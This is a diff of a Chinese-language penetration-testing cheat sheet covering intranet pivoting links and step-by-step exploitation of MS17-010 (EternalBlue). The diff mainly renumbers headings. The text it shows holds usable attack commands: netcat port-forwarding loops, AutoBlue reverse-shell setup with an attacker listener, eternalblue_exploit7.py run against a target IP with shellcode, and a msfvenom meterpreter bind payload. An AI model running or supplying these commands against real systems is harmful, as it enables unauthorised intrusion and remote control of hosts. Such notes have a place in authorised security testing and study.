@@ -4,7 +4,7 @@ https://gitee.com/windyjxx/projects
 [ENScan_GO | 剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)
 
 
-## 内网穿透
+## 内网相关/内网穿透
 [干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
 [不同中间件端口复用代理解决方案](https://9bie.org/index.php/archives/969/)
 [Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
@@ -54,7 +54,7 @@ nc -l -p 8888 -c "nc 192.168.19.153 22"
 ```bash
 while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 ```
-### MS17-010: AutoBlue-MS17-010
+## MS17-010: AutoBlue-MS17-010
 [​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
 [py/Cobalt Strike DLL](https://www.cnblogs.com/Thorndike/p/15242477.html)
 
@@ -67,10 +67,14 @@ fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
 Eternalblue
 ```
 
+
+### python AutoBlue 使用
+
 ```shell
+# 1. config
 ./shell_prep.sh
 
-# 普通反弹shell, 成功率较高
+# 2. create shell 普通反弹shell, 成功率较高
 LHOST for reverse connection:
 192.168.183.231
 LPORT you want x64 to listen on:
@@ -82,12 +86,12 @@ Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
 Type 0 to generate a staged payload or 1 to generate a stageless payload
 1
 
-## 攻击机
+## 3. Listen 攻击机
 nc -lvvp 1234
 
-## 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
+## 4. expoloit 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
 python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64.bin
-## 如果是meterpreter, 要用sc_x64_msf.bin, 成功率不高
+### 如果是meterpreter, 要用sc_x64_msf.bin, 比上面容易蓝屏 成功率不高
 python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64_msf.bin
 ```
 
@@ -107,7 +111,7 @@ python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
 ```
 
 
-Eternalblue
+### Eternalblue
 ```
 Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 10.10.20.7 --TargetPort 445
 msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll
